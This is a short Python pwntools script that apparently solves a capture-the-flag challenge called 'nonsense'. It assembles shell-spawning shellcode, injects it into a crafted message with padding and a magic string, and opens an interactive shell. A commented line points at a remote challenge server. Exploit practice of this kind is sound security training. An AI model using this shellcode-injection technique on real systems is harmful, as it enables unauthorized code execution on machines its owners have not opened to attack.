#!/usr/bin/env python
from pwn import *
import pwnlib.elf
import pwnlib.shellcraft

# c = remote('60.250.197.227', 10001)
c = process('./nonsense')
e = ELF('./nonsense')
raw_input(':')
context.terminal = ['alacritty', '-e', 'sh', '-c']
#gdb.attach(c)

#init
context.os = 'linux'
context.arch = 'amd64'
# context.log_level ='debug'

shell = shellcraft.sh()
print(asm(shell))
print(disasm(b"\x77\x20"))

name = b'1' * 15 + b'\n'
c.sendafter("?", name)

ans = b"\x77\x20"
ans += b"wubbalubbadubdub"
ans += b'1' * 16
ans += asm(shell)  # put shellcode to message

c.sendline(ans)

c.interactive()
c.close()
